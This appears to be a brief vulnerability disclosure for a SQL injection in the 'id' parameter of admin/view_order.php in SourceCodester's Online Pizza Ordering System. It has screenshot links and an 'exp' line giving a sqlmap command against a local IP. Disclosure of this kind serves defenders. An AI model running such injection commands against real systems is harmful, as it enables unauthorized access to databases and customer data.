vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220946038-2b3a61d0-4630-40b5-9470-cc769754de9d.png)


exp

```
sqlmap.py -u "http://192.168.31.50/php-opos/admin/view_order.php?id=1"
```

![image](https://user-images.githubusercontent.com/30823782/220946092-b6a62e67-56b0-4c59-9a53-8f18cbbb2f14.png)
